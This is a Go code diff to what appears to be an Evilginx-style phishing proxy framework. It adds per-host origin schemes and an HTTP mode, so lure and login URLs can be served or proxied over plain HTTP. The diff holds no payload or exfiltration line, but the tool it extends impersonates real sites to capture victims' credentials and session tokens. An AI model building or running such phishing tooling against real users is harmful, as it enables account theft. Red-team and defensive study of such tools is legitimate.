@@ -19,6 +19,7 @@ type ProxyHost struct {
 	handle_session  bool
 	is_landing      bool
 	auto_filter     bool
+	orig_scheme     string // "http" or "https" - scheme for connecting to origin server (default: "https")
 }
 
 type SubFilter struct {
@@ -131,6 +132,7 @@ type Phishlet struct {
 	intercept        []Intercept
 	customParams     map[string]string
 	isTemplate       bool
+	defaultHttpMode  bool // Default HTTP mode from phishlet YAML
 }
 
 type ConfigParam struct {
@@ -146,6 +148,7 @@ type ConfigProxyHost struct {
 	Session    bool    `mapstructure:"session"`
 	IsLanding  bool    `mapstructure:"is_landing"`
 	AutoFilter *bool   `mapstructure:"auto_filter"`
+	OrigScheme *string `mapstructure:"orig_scheme"` // "http" or "https" - scheme for connecting to origin server (default: "https")
 }
 
 type ConfigSubFilter struct {
@@ -221,6 +224,7 @@ type ConfigIntercept struct {
 type ConfigPhishlet struct {
 	Name        string             `mapstructure:"name"`
 	RedirectUrl string             `mapstructure:"redirect_url"`
+	HttpMode    *bool              `mapstructure:"http_mode"` // Enable HTTP mode by default when phishlet is enabled
 	Params      *[]ConfigParam     `mapstructure:"params"`
 	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts"`
 	SubFilters  *[]ConfigSubFilter `mapstructure:"sub_filters"`
@@ -407,7 +411,11 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 		if ph.AutoFilter != nil {
 			auto_filter = *ph.AutoFilter
 		}
-		p.addProxyHost(p.paramVal(*ph.PhishSub), p.paramVal(*ph.OrigSub), p.paramVal(*ph.Domain), ph.Session, ph.IsLanding, auto_filter)
+		orig_scheme := "https"
+		if ph.OrigScheme != nil {
+			orig_scheme = *ph.OrigScheme
+		}
+		p.addProxyHost(p.paramVal(*ph.PhishSub), p.paramVal(*ph.OrigSub), p.paramVal(*ph.Domain), ph.Session, ph.IsLanding, auto_filter, orig_scheme)
 	}
 	if len(p.proxyHosts) == 0 {
 		return fmt.Errorf("proxy_hosts: list cannot be empty")
@@ -758,6 +766,12 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			p.landing_path[n] = p.paramVal(p.landing_path[n])
 		}
 	}
+
+	// Set default HTTP mode from phishlet YAML
+	if fp.HttpMode != nil && *fp.HttpMode {
+		p.defaultHttpMode = true
+	}
+
 	return nil
 }
 
@@ -779,6 +793,11 @@ func (p *Phishlet) GetPhishHosts(use_wildcards bool) []string {
 func (p *Phishlet) GetLureUrl(path string) (string, error) {
 	var ret string
 	host := p.cfg.GetBaseDomain()
+	// Get the scheme from phishlet config (uses http_mode setting)
+	scheme := "https"
+	if p.cfg.IsPhishletHttpModeEnabled(p.Name) {
+		scheme = "http"
+	}
 	for _, h := range p.proxyHosts {
 		if h.is_landing {
 			phishDomain, ok := p.cfg.GetSiteDomain(p.Name)
@@ -787,12 +806,42 @@ func (p *Phishlet) GetLureUrl(path string) (string, error) {
 			}
 		}
 	}
-	ret = "https://" + host + path
+	ret = scheme + "://" + host + path
 	return ret, nil
 }
 
+// GetOrigSchemeForHost returns the origin scheme (http/https) for connecting to a given original hostname
+func (p *Phishlet) GetOrigSchemeForHost(hostname string) string {
+	hostname = strings.ToLower(hostname)
+	for _, ph := range p.proxyHosts {
+		host := combineHost(ph.orig_subdomain, ph.domain)
+		if strings.ToLower(host) == hostname {
+			return ph.orig_scheme
+		}
+	}
+	// Use http_mode setting as fallback instead of always defaulting to https
+	if p.cfg.IsPhishletHttpModeEnabled(p.Name) {
+		return "http"
+	}
+	return "https"
+}
+
 func (p *Phishlet) GetLoginUrl() string {
-	return "https://" + p.login.domain + p.login.path
+	// Find the scheme for the login domain from proxy hosts
+	scheme := "https"
+	for _, ph := range p.proxyHosts {
+		host := combineHost(ph.orig_subdomain, ph.domain)
+		if strings.ToLower(host) == strings.ToLower(p.login.domain) {
+			scheme = ph.orig_scheme
+			break
+		}
+	}
+	return scheme + "://" + p.login.domain + p.login.path
+}
+
+// HasDefaultHttpMode returns true if the phishlet YAML specifies http_mode: true
+func (p *Phishlet) HasDefaultHttpMode() bool {
+	return p.defaultHttpMode
 }
 
 func (p *Phishlet) GetLandingPhishHost() string {
@@ -889,15 +938,22 @@ func (p *Phishlet) GenerateTokenSet(tokens map[string]string) map[string]map[str
 	return ret
 }
 
-func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, domain string, handle_session bool, is_landing bool, auto_filter bool) {
+func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, domain string, handle_session bool, is_landing bool, auto_filter bool, orig_scheme string) {
 	phish_subdomain = strings.ToLower(phish_subdomain)
 	orig_subdomain = strings.ToLower(orig_subdomain)
 	domain = strings.ToLower(domain)
+	if orig_scheme == "" {
+		orig_scheme = "https" // default to https
+	}
+	orig_scheme = strings.ToLower(orig_scheme)
+	if orig_scheme != "http" && orig_scheme != "https" {
+		orig_scheme = "https"
+	}
 	if !p.domainExists(domain) {
 		p.domains = append(p.domains, domain)
 	}
 
-	p.proxyHosts = append(p.proxyHosts, ProxyHost{phish_subdomain: phish_subdomain, orig_subdomain: orig_subdomain, domain: domain, handle_session: handle_session, is_landing: is_landing, auto_filter: auto_filter})
+	p.proxyHosts = append(p.proxyHosts, ProxyHost{phish_subdomain: phish_subdomain, orig_subdomain: orig_subdomain, domain: domain, handle_session: handle_session, is_landing: is_landing, auto_filter: auto_filter, orig_scheme: orig_scheme})
 }
 
 func (p *Phishlet) addSubFilter(hostname string, subdomain string, domain string, mime []string, regexp string, replace string, redirect_only bool, with_params []string) {
